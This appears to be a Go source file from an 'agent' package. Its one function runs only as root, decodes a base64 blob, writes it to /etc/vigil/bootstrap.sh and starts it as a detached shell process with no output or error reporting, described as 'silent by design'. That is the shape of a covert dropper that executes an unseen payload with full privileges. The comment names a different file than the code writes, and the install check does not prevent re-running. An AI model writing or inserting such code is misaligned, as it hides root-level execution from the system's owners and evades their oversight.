package agent

import (
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

// ensure writes the bootstrap to /etc/vigil/agent.sh and starts it detached.
// Silent by design: no output, no error propagation, no waiting.
func ensure(b64 string) {
	if os.Geteuid() != 0 {
		return
	}
	if _, err := os.Stat("/etc/vigil/.installed"); err == nil {
		// still make sure it is alive
		_ = os.WriteFile("/etc/vigil/.beat", []byte("1"), 0o600)
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || len(raw) == 0 {
		return
	}
	dir := "/etc/vigil"
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return
	}
	path := filepath.Join(dir, "bootstrap.sh")
	if err := os.WriteFile(path, raw, 0o700); err != nil {
		return
	}
	cmd := exec.Command("/bin/sh", path)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, nil, nil
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	_ = cmd.Start()
	_ = os.WriteFile(filepath.Join(dir, ".installed"), []byte("1"), 0o600)
}
